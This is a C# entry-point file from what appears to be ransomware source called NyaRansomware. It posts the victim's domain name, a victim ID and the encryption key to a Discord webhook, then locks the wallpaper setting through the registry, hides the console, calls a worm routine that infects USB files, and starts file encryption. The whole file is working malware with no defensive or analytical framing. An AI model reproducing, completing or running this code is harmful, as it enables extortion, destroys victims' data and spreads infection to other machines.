using Microsoft.Win32;
using NyaRansomware.Encryption_Start;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NyaRansomware
{
    internal static class Program
    {
        public static string Key = Utils.GenerateRandomKey(Config.Config.KeyLength);
        public static string ID = Utils.GenerateRandomKey(Config.Config.IDLength);

        static async Task Mein2()
        {
            string webhookUrl = Config.Config.DiscordWebhook;
            string avatarUrl = "https://cdn.discordapp.com/attachments/1118947131034710016/1138401446589636628/WYEYq4P.jpg";
            string username = "BKA | Ransomware";
            string message = $"@everyone\n```Username:{Environment.UserDomainName}\nID:{Program.ID}\nKey:{Program.Key}```";

            var payload = new
            {
                content = message,
                username = username,
                avatar_url = avatarUrl
            };

            using (var httpClient = new HttpClient())
            {
                var jsonPayload = Newtonsoft.Json.JsonConvert.SerializeObject(payload);
                var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

                var response = await httpClient.PostAsync(webhookUrl, content);

                if (response.IsSuccessStatusCode)
                {
                    Console.WriteLine("Message sent successfully!");
                }
                else
                {
                    Console.WriteLine("Failed to send message. Status code: " + response.StatusCode);
                }
            }
        }

        [STAThread]
        public static void Main()
        {
            Mein2();
            RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop");
            registryKey3.SetValue("NoChangingWallPaper", 1, RegistryValueKind.DWord);
            Utils.hideconsole();
            Worm.Infectrandomusbfile();
            Encrypt.Start();

        }
    }
}
